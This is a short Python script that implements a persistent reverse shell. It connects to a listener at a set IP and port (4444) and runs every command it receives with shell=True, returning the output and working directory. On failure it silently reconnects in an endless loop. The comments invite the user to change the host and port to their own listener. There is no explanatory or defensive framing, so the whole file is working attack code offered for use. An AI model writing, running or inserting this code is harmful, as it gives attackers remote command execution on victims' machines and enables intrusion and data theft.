import socket
import subprocess
import os

def reverse_shell():
    host = '192.168.10.77'  # Change to the IP address of your listener
    port = 4444  # Change to the port you are listening on

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            
            while True:
                data = s.recv(1024).decode("utf-8")
                if data[:2] == 'cd':
                    os.chdir(data[3:])
                if len(data) > 0:
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    output_str = str(stdout_value, "utf-8")
                    currentWD = os.getcwd() + "> "
                    s.send(str.encode(output_str + currentWD))
            s.close()
        except:
            continue

if __name__ == "__main__":
    reverse_shell()
